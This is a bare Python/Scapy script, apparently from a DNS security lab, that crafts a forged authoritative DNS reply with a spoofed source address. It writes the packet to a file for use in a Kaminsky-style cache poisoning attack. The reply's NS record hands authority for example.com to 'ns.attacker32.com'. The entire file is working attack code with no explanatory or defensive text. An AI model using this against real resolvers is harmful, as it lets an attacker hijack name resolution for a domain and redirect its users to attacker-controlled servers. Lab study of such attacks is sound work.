#!usr/bin/python3
from scapy.all import *

f = open("ip_res.bin","wb")
name="aaaaa.example.com"
domain = "example.com"
ns = "ns.attacker32.com"
Qdsec = DNSQR(qname = name)
Anssec = DNSRR(rrname = name, type = "A", rdata = "1.2.3.4", ttl = 259200)
NSsec = DNSRR(rrname = domain, type = "NS", rdata = ns, ttl = 259200)
DNSpkt = DNS(id = 0xAAAA, aa = 1, rd = 1, qr = 1, qdcount = 1, ancount = 1, nscount = 1, arcount = 0, qd = Qdsec, an = Anssec, ns = NSsec)
IPpkt = IP(dst = "10.10.10.4", src = "10.10.10.2")
UDPpkt = UDP(dport = 33333, sport = 53, chksum = 0)
reply = IPpkt/UDPpkt/DNSpkt
f.write(bytes(reply))
